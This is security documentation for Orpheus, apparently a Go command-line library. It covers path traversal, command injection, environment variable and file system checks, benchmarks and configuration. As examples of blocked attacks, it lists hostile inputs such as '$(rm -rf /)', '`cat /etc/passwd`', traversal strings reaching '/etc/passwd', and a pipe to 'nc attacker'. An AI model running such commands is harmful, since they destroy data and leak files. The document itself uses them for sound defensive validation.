# Orpheus - Security Documentation

## Security Overview

Orpheus has undergone comprehensive security testing and implements professional-grade security controls.

## Security Posture Summary

**465 Security Test Cases** - All passing
**Costs measured, not estimated** - see [Performance Impact](#performance-impact)

## Security Controls Implemented

### 1. Path Traversal Attack Prevention

**Threat**: Malicious path traversal attempts to access sensitive files

```go
// Examples of blocked attacks:
"../../../etc/passwd"                    // Unix path traversal
"..\\..\\..\\windows\\system32\\config" // Windows path traversal  
"%2e%2e%2f%2e%2e%2f%2e%2e%2f"          // URL encoded traversal
"file\x00.config"                       // Null byte injection
```

**Implementation**:
- Dangerous pattern detection in `containsSuspiciousPatterns()`
- Path normalization and validation in `ValidatePathFlag()`
- Cross-platform protection (Unix and Windows)
- URL encoding attack prevention: percent-escapes are decoded (up to three
  layers, mixed forms such as `%2e.` included) before looking for `..`
- Symlinks are resolved: the system-path, allowed and denied checks run again
  on the path the link really leads to (or on its deepest existing parent,
  for a file not created yet)
- `AllowedPaths` and `DeniedPaths` match whole path segments: `/srv/app`
  covers `/srv/app/x` but not `/srv/app-secrets`; `*` matches one segment
  (`/home/*/.ssh`)
- Relative paths are judged by where they point: they are made absolute
  against the working directory before the system-path, allowed and denied
  checks, so `passwd` typed in `/etc` is rejected like `/etc/passwd`.
  Relative `AllowedPaths` and `DeniedPaths` entries are resolved against the
  working directory at validation time too (`AllowedPaths: []string{"data"}`
  means `data` under the directory the program runs in)

Path flags reject only what would run a command if the path reached a shell:
`$(`, backtick, `;`, `|` and `&&`, plus control characters and NUL. File names
such as `Dropbox`, `deleted_items.txt`, `report--v2.pdf` or `R&D` are accepted.
String flags and environment values follow the same rule (see below).

### 2. Command Injection Prevention

**Threat**: Shell command injection through user input

```go
// Examples of blocked injections:
"$(rm -rf /)"           // Command substitution
"`cat /etc/passwd`"     // Backtick execution
"file; rm -rf /"        // Command chaining
"input | nc attacker"   // Pipe injection
"data && malicious"     // Logic chaining
```

**Implementation**:
- The same five patterns are rejected in path flags, string flags and
  environment values: `$(`, backtick, `;`, `|`, `&&`
- Other shell metacharacters (`$ ( ) { } [ ] < >`), `../` and percent-escapes
  add a warning to a string flag (`ValidateInput` reports warnings as errors)
  and reject an untrusted environment value
- NUL, control characters (tab, LF and CR excepted) and values longer than
  `MaxArgLength` are rejected

### 3. SQL, HTML and Other Downstream Languages

Orpheus does not look for SQL or HTML in input. Words such as `DROP`,
`DELETE` or `INSERT`, comment markers (`--`, `/* */`), a lone `&` and HTML
tags are ordinary in descriptions, file names and messages ("insert the
delete key -- R&D"), and rejecting them refused legitimate input while
giving no real protection.

Keeping a value out of a query is the application's job, where the query is
built: use parameterized queries (`db.Query("... WHERE name = ?", name)`),
never string concatenation. Likewise, escape values for HTML where the page
is rendered.

### 4. Environment Variable Security

**Threat**: Environment variable manipulation and sensitive data exposure

**Malicious Environment Variables Blocked**:
- `PATH` manipulation (binary hijacking prevention)
- `LD_PRELOAD` injection (library injection prevention)
- `SHELL` manipulation (command injection prevention)
- `HOME` directory traversal attempts

**Trusted Variables** (`TrustedEnvPrefixes`): an entry is an exact variable
name, or a prefix when it ends with `_`. The default
`{"ORPHEUS_", "HOME", "PATH", "USER"}` trusts `ORPHEUS_HOME` and `USER`, but
not `USER_EVIL`, `USERNAME` or `PATHEXT`. A value from an untrusted variable
carries a warning, and is rejected if it holds a shell metacharacter, `../` or
a percent-escape. Every value follows the string-flag rules above.

**Sensitive Data Protection**:
- Automatic detection of sensitive environment variables
- Trusted name and namespace validation
- Environment variable sanitization
- Secure environment handling in `ValidateEnvironmentValue()`

### 5. File System Security

**Threat**: Unauthorized file system access and manipulation

**File Permission Analysis**:
- Readable, writable and executable are answered for the current user by
  `access(2)` on Unix (group and other bits, root, ACLs and read-only mounts
  included); a symlink is described by its target
- Executable file detection and analysis
- Write permission security assessment
- Read-only file validation
- System file protection

**Protected System Paths**:
```go
// Blocked system directories:
"/etc/", "/proc/", "/sys/"           // Unix system directories
"/dev/", "/boot/", "/root/"          // Unix critical directories  
"C:\\Windows\\", "C:\\System32\\"    // Windows system directories
```

**Implementation**:
- Comprehensive file permission analysis in `AnalyzeFilePermissions()`
- System path detection and blocking
- File operation validation in `ValidateFileOperation()`
- Security risk assessment and recommendations

### 6. Windows-Specific Attack Prevention

**Threat**: Windows-specific security vulnerabilities

**Windows Device Names Blocked**:
- `CON`, `PRN`, `AUX`, `NUL`
- `COM1-9`, `LPT1-9`

**Windows Alternate Data Streams (ADS) Protection** (on Windows only; elsewhere
`:` is an ordinary filename character):
- Detection of `:` in filenames
- ADS attack prevention
- Windows path validation

**Implementation**:
- Windows device name detection
- Cross-platform path validation
- Windows-specific dangerous pattern matching

### 7. Buffer Overflow Protection

**Threat**: Buffer overflow attacks through oversized input

**Length Limits**:
- Maximum input length: 4096 bytes per value (`MaxArgLength`)
- Maximum command line: 64 KiB for all arguments together
  (`MaxTotalArgsSize`), checked by `ValidateArgs`, which an application calls
  before `app.Run`:

```go
validator := security.NewInputValidator(security.DefaultValidationConfig())
if err := validator.ValidateArgs(os.Args[1:]); err != nil {
    fmt.Fprintln(os.Stderr, err)
    os.Exit(2)
}
if err := app.Run(os.Args[1:]); err != nil {
    log.Fatal(err)
}
```

- Path length validation
- Memory usage monitoring
- Automatic truncation and rejection

**Implementation**:
- Input length validation in `validateBasicInput()`
- Memory-safe string operations
- Buffer overflow prevention controls

### 8. Unicode and Encoding Attack Prevention

**Threat**: Unicode normalization and encoding-based attacks

**Protected Against**:
- Unicode normalization attacks
- Double URL encoding
- Character encoding bypasses
- Homograph attacks

**Implementation**:
- Unicode character validation
- Encoding detection and normalization
- Multi-layer encoding protection

### 9. Concurrency and Race Condition Protection

**Threat**: Race conditions in multi-threaded environments

**Concurrency Safety**:
- Thread-safe validation operations
- Race condition testing (50 goroutines × 100 iterations)
- Memory-safe concurrent access
- Atomic operations where required

**Implementation**:
- Mutex-protected cache operations
- Thread-safe validation methods
- Concurrent stress testing validation

### 10. Memory Leak Prevention

**Threat**: Memory exhaustion through resource leaks

**Memory Management**:
- Automatic cache eviction (LRU policy)
- Memory usage monitoring
- Resource cleanup validation
- Leak prevention testing (1000+ unique inputs)

**Implementation**:
- Smart cache management in validation layer
- Memory leak prevention controls
- Resource cleanup verification

## Performance Impact

Measured on an AMD Ryzen 5 7520U. Reproduce with:

```bash
go test -run=XXX -bench='Validate|Analyze' -benchtime=2s -count=3 ./security/
```

| Operation | Time | Allocations |
|---|---|---|
| `ValidateSecurePath`, path rejected | ~350 ns | 2 |
| `ValidatePathFlag`, cached | ~220 ns | 2 |
| `ValidateStringFlag` | ~500 ns | 2 |
| `ValidateEnvironmentValue` | ~160 ns | 1 |

Two things worth knowing. Rejecting a path is much cheaper than accepting
one, because a violation returns at the layer that found
it while a valid path is carried through every remaining check — an attack costs
less to refuse than ordinary input costs to admit. And the path validators are
dominated by file system access, so the result cache is what makes them cheap:
it is enabled by default. An accepted path costs one `lstat` per path component, because symlinks
are resolved before the path is judged, a relative path also reads the
working directory once, and `AnalyzeFilePermissions` adds
`access(2)` calls for the current user's real permissions.

The cache holds `CacheSize` entries, 1000 by default, each a `ValidatedInput`
holding the original and sanitized strings.

## Security Testing

### Red Team Testing Results

**Test Coverage**: 465 security test cases (`go test -v -run 'Security|Valid|Path|Sanitiz|Injection|Traversal|Prompt' . ./errs ./observe ./storage ./security ./prompt | grep -c -- '--- PASS'`)
- Path traversal attacks: 8 test scenarios
- File permission validation: 4 test scenarios  
- Malicious input handling: 11 attack vectors
- Environment variable security: 5 test scenarios
- Windows-specific attacks: 4 test scenarios
- Performance impact validation: 2 benchmarks
- Integration scenario testing: 2 complex scenarios
- Concurrency and race conditions: 3 stress tests
- Memory leak prevention: 1 extensive test
- Security edge cases: 4 extreme scenarios

**Security Scanner Results**:
```
GoSec Security Scanner: 0 issues found
Files scanned: 16
Lines of code analyzed: 4,781
Critical vulnerabilities: 0
High-risk issues: 0
Medium-risk issues: 0
Low-risk issues: 0
```

### Automated Security Testing

Security tests run automatically in CI/CD pipeline:
```bash
# Run all security tests
make test-security

# Run security scanner
make security-scan

# Run with race detector
go test -race ./...
```

## Security Configuration

### Default Security Configuration

`DefaultValidationConfig()` returns:

```go
security.ValidationConfig{
    SecurityConfig:     security.DefaultConfig(),
    ValidatePathArgs:   true,
    ValidateFileArgs:   true,
    NormalizePaths:     true,
    ValidateEnvVars:    true,
    TrustedEnvPrefixes: []string{"ORPHEUS_", "HOME", "PATH", "USER"},
    SanitizeInputs:     true,
    MaxArgLength:       4096,
    MaxTotalArgsSize:   65536,
    EnableCaching:      true,
    CacheSize:          1000,
}
```

### Custom Security Configuration

```go
// Start from the defaults and tighten what the application needs
config := security.DefaultValidationConfig()
config.MaxArgLength = 2048                          // stricter per-value limit
config.TrustedEnvPrefixes = []string{"MYAPP_", "HOME"} // MYAPP_* and HOME only
config.CacheSize = 500
validator := security.NewInputValidator(config)
```

## Security Best Practices

### 1. Input Validation
```go
// Always validate user input
if result := validator.ValidateStringFlag("name", userInput); !result.IsValid {
    return fmt.Errorf("invalid input: %s", strings.Join(result.ValidationErrors, "; "))
}
```

### 2. Path Validation
```go
// Validate file paths before operations
if result := validator.ValidatePathFlag("config", filePath); !result.IsValid {
    return fmt.Errorf("unsafe path: %s", strings.Join(result.ValidationErrors, "; "))
}
```

### 3. Environment Variable Handling
```go
// Validate environment variables
if result := validator.ValidateEnvironmentValue("MYAPP_HOME", envValue); !result.IsValid {
    return fmt.Errorf("unsafe environment variable: %s", strings.Join(result.ValidationErrors, "; "))
}
```

### 4. File Operations
```go
// Validate file operations
if result := validator.ValidateFileOperation(path, "write"); !result.IsValid {
    return fmt.Errorf("unsafe file operation: %s", strings.Join(result.ValidationErrors, "; "))
}
```
---

Orpheus • an AGILira library